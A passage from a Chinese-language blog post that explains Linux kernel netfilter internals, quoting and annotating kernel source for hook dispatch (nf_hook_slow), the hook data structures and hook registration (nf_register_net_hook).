class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DECNET)</span><br><span class="hljs-keyword">case</span> NFPROTO_DECNET:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_decnet[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 调用nf_hook_slow执行hook链</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (hook_head) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_state</span> <span class="hljs-title">state</span>;</span><br><br>nf_hook_state_init(&amp;state, hook, pf, indev, outdev,<br>   sk, net, okfn);<br><br>ret = nf_hook_slow(skb, &amp;state, hook_head, <span class="hljs-number">0</span>);<br>&#125;<br>rcu_read_unlock();<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>CONFIG_JUMP_LABEL的定义，简单说就是优化一些几乎为真 &#x2F; 假的分支，加快执行速度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">config JUMP_LABEL<br><span class="hljs-type">bool</span> <span class="hljs-string">&quot;Optimize very unlikely/likely branches&quot;</span><br>depends on HAVE_ARCH_JUMP_LABEL<br>depends on CC_HAS_ASM_GOTO<br>help<br> This option enables a transparent branch optimization that<br> makes certain almost-always-<span class="hljs-literal">true</span> or almost-always-<span class="hljs-literal">false</span> branch<br> conditions even cheaper to execute within the kernel.<br><br> Certain performance-sensitive kernel code, such as trace points,<br> scheduler functionality, networking code and KVM have such<br> branches and include support <span class="hljs-keyword">for</span> this optimization technique.<br><br> If it is detected that the compiler has support <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;asm goto&quot;</span>,<br> the kernel will compile such branches with just a nop<br> instruction. When the condition flag is toggled to <span class="hljs-literal">true</span>, the<br> nop will be converted to a jump instruction to execute the<br> conditional block of instructions.<br><br> This technique lowers overhead and stress on the branch prediction<br> of the processor and generally makes the kernel faster. The update<br> of the condition is slower, but those are always very rare.<br><br> ( On <span class="hljs-number">32</span>-bit x86, the necessary options added to the compiler<br>   flags may increase the size of the kernel slightly. )<br></code></pre></td></tr></table></figure></li><li><p>高版本的nf_hook不是全局储存的，而是注册在network namespace中，net结构体表示network namespace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> &#123;</span><br>    <br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nf</span><span class="hljs-title">nf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_NF_CONNTRACK) || defined(CONFIG_NF_CONNTRACK_MODULE)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_ct</span><span class="hljs-title">ct</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_NF_TABLES) || defined(CONFIG_NF_TABLES_MODULE)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nftables</span><span class="hljs-title">nft</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>netns_nf储存了不同协议的hook链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nf</span> &#123;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_ipv4</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_ipv6</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_ARP</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_arp</span>[<span class="hljs-title">NF_ARP_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_BRIDGE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_bridge</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DECNET)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_decnet</span>[<span class="hljs-title">NF_DN_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> &#123;</span><br>u16num_hook_entries;<br><span class="hljs-comment">/* padding */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entry</span><span class="hljs-title">hooks</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entry</span> &#123;</span><br>nf_hookfn*hook;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_hookfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *priv,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_state *state)</span>;<br></code></pre></td></tr></table></figure><p>结构目前看来大概是这样👇</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/nf_hook.png" class title="nf_hook"><ul><li>nf_hook_entries表示NF_INET_PRE_ROUTING等5种hook点</li><li>nf_hook_entry表示一个hook点上的一个hook函数</li></ul></li><li><p>nf_hook_state_init初始化了中间结构体nf_hook_state</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nf_hook_state_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nf_hook_state *p,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook,</span><br><span class="hljs-params">      <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net_device *indev,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net_device *outdev,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> sock *sk,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">      <span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br>p-&gt;hook = hook;<br>p-&gt;pf = pf;<br>p-&gt;in = indev;<br>p-&gt;out = outdev;<br>p-&gt;sk = sk;<br>p-&gt;net = net;<br>p-&gt;okfn = okfn;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_state</span> &#123;</span><br>u8 hook;<br>u8 pf;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">in</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">out</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span>;</span><br><span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *);<br>&#125;;<br></code></pre></td></tr></table></figure><p>nf_hook_slow真正执行了所有的hook，并根据hook的返回值决定下一步动作，丢弃报文 &#x2F; 接受报文 &#x2F; 加入队列由对应模块处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Returns 1 if okfn() needs to be executed by the caller,</span><br><span class="hljs-comment"> * -EPERM for NF_DROP, 0 otherwise.  Caller must hold rcu_read_lock. */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">nf_hook_slow</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> nf_hook_state *state,</span><br><span class="hljs-params"> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *e, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> s)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> verdict;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;<br>verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);<br><span class="hljs-keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NF_DROP:<br>kfree_skb(skb);<br>ret = NF_DROP_GETERR(verdict);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EPERM;<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">case</span> NF_QUEUE:<br>ret = nf_queue(skb, state, s, verdict);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* Implicit handling for NF_STOLEN, as well as any other</span><br><span class="hljs-comment"> * non conventional verdicts.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>EXPORT_SYMBOL(nf_hook_slow);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nf_hook_entry_hookfn</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entry *entry, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> nf_hook_state *state)</span><br>&#123;<br><span class="hljs-keyword">return</span> entry-&gt;hook(entry-&gt;priv, skb, state);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="hook注册：nf-register-net-hook"><a href="#hook注册：nf-register-net-hook" class="headerlink" title="hook注册：nf_register_net_hook"></a>hook注册：nf_register_net_hook</h2><p>根据协议注册不同的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nf_register_net_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (reg-&gt;pf == NFPROTO_INET) &#123;<br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_INET_INGRESS) &#123;<br>err = __nf_register_net_hook(net, NFPROTO_INET, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = __nf_register_net_hook(net, NFPROTO_IPV4, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>err = __nf_register_net_hook(net, NFPROTO_IPV6, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) &#123;<br>__nf_unregister_net_hook(net, NFPROTO_IPV4, reg);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = __nf_register_net_hook(net, reg-&gt;pf, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(nf_register_net_hook);<br></code></pre></td></tr></table></figure><p>nf_hook_ops结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> &#123;</span><br><span class="hljs-comment">/* User fills in from here down. */</span><br>nf_hookfn*hook;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span>*<span class="hljs-title">dev</span>;</span><br><span class="hljs-type">void</span>*priv;<br>u8pf;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_hook_ops_type</span><span class="hljs-title">hook_ops_type</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>hooknum;<br><span class="hljs-comment">/* Hooks are ordered in ascending priority. */</span><br><span class="hljs-type">int</span>priority;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>hook：hook函数</p></li><li><p>dev：net设备</p></li><li><p>priv：指针</p></li><li><p>pf：协议类型，PF_INET之类的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Supported address families. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_UNSPEC0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_UNIX1<span class="hljs-comment">/* Unix domain sockets */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_LOCAL1<span class="hljs-comment">/* POSIX name for AF_UNIX*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_INET2<span class="hljs-comment">/* Internet IP Protocol */</span></span><br><br><br><span class="hljs-comment">/* Protocol families, same as address families. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_UNSPECAF_UNSPEC</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_UNIXAF_UNIX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_LOCALAF_LOCAL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_INETAF_INET</span><br><br><br></code></pre></td></tr></table></figure></li><li><p>hook_ops_type：注册的hook类型，是不是nf_tables</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_hook_ops_type</span> &#123;</span><br>NF_HOOK_OP_UNDEFINED,<br>NF_HOOK_OP_NF_TABLES,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>hooknum：hook类型（是哪个hook点），也是nf_hook_entries的index</p></li><li><p>priority：优先级</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_ip_hook_priorities</span> &#123;</span><br>NF_IP_PRI_FIRST = INT_MIN,<br>NF_IP_PRI_RAW_BEFORE_DEFRAG = <span class="hljs-number">-450</span>,<br>NF_IP_PRI_CONNTRACK_DEFRAG = <span class="hljs-number">-400</span>,<br>NF_IP_PRI_RAW = <span class="hljs-number">-300</span>,<br>NF_IP_PRI_SELINUX_FIRST = <span class="hljs-number">-225</span>,<br>NF_IP_PRI_CONNTRACK = <span class="hljs-number">-200</span>,<br>NF_IP_PRI_MANGLE = <span class="hljs-number">-150</span>,<br>NF_IP_PRI_NAT_DST = <span class="hljs-number">-100</span>,<br>NF_IP_PRI_FILTER = <span class="hljs-number">0</span>,<br>NF_IP_PRI_SECURITY = <span class="hljs-number">50</span>,<br>NF_IP_PRI_NAT_SRC = <span class="hljs-number">100</span>,<br>NF_IP_PRI_SELINUX_LAST = <span class="hljs-number">225</span>,<br>NF_IP_PRI_CONNTRACK_HELPER = <span class="hljs-number">300</span>,<br>NF_IP_PRI_CONNTRACK_CONFIRM = INT_MAX,<br>NF_IP_PRI_LAST = INT_MAX,<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><p>__nf_register_net_hook将新的hook插入对应的nf_hook_entries表项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __nf_register_net_hook(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> pf,<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">p</span>, *<span class="hljs-title">new_hooks</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> **<span class="hljs-title">pp</span>;</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 类型检查</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (pf) &#123;<br><span class="hljs-keyword">case</span> NFPROTO_NETDEV:<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_NETFILTER_INGRESS</span><br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_NETDEV_INGRESS)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_NETFILTER_EGRESS</span><br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_NETDEV_EGRESS)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">if</span> ((reg-&gt;hooknum != NF_NETDEV_INGRESS &amp;&amp;<br>     reg-&gt;hooknum != NF_NETDEV_EGRESS) ||<br>    !reg-&gt;dev || dev_net(reg-&gt;dev) != net)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_INET:<br><span class="hljs-keyword">if</span> (reg-&gt;hooknum != NF_INET_INGRESS)<br><span class="hljs-keyword">break</span>;<br><br>err = nf_ingress_check(net, reg, NF_INET_INGRESS);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 取出pf对应协议的hooknum对应hook点的nf_hook_entries项</span><br><span class="hljs-comment">     */</span><br>pp = nf_hook_entry_head(net, pf, reg-&gt;hooknum, reg-&gt;dev);<br><span class="hljs-keyword">if</span> (!pp)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>mutex_lock(&amp;nf_hook_mutex);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 更新nf_hook_entries，插入新的hook</span><br><span class="hljs-comment">     */</span><br>p = nf_entry_dereference(*pp);<br>new_hooks = nf_hook_entries_grow(p, reg);<br><br><span class="hljs-keyword">if</span> (!IS_ERR(new_hooks)) &#123;<br>hooks_validate(new_hooks);<br>rcu_assign_pointer(*pp, new_hooks);<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. 一些检查</span><br><span class="hljs-comment">     */</span><br>mutex_unlock(&amp;nf_hook_mutex);<br><span class="hljs-keyword">if</span> (IS_ERR(new_hooks))<br><span class="hljs-keyword">return</span> PTR_ERR(new_hooks);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_INGRESS</span><br><span class="hljs-keyword">if</span> (nf_ingress_hook(reg, pf))<br>net_inc_ingress_queue();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_EGRESS</span><br><span class="hljs-keyword">if</span> (nf_egress_hook(reg, pf))<br>net_inc_egress_queue();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>nf_static_key_inc(reg, pf);<br><br>BUG_ON(p == new_hooks);<br>nf_hook_entries_free(p);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看看nf_hook_entries更新的过程，就是nf_hook_entries_grow函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 